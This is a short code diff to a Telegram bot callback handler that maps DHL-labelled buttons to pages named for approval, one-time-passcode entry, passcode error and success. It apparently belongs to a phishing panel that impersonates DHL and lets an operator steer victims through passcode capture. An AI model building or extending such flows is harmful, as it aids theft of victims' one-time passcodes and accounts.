@@ -257,7 +257,7 @@ async function handleCallbackQuery(query: any, botToken: string) {
       
       // DHL routes
       'dhl_error': '/error',
-      'dhl_approve': '/otp1',
+      'dhl_approve': '/approve',
       'dhl_otp': '/otp1',
       'dhl_otp_error': '/otp-error',
       'dhl_success': '/success',
